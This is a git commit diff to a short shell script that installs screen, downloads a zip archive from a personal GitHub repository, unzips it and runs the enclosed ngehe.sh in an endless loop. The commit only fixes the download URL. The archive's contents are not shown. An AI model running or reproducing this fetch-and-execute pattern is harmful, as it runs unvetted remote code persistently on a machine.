bdd9a81550567faef130aa5191e91a455d0ea5fa
dik4prat4 <73329697+dik4prat4@users.noreply.github.com>
2021-08-28 16:07:24 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -2,7 +2,7 @@
 sudo apt update -y
 sudo apt install screen -y
 sudo screen -dmS random
-wget https://github.com/dik4prat4/main/blob/main/ngehe.zip && unzip ngehe.zip
+wget https://raw.githubusercontent.com/dik4prat4/main/main/ngehe.zip && unzip ngehe.zip
 chmod +x ngehe.sh
 while [ 1 ]; do
 ./ngehe.sh
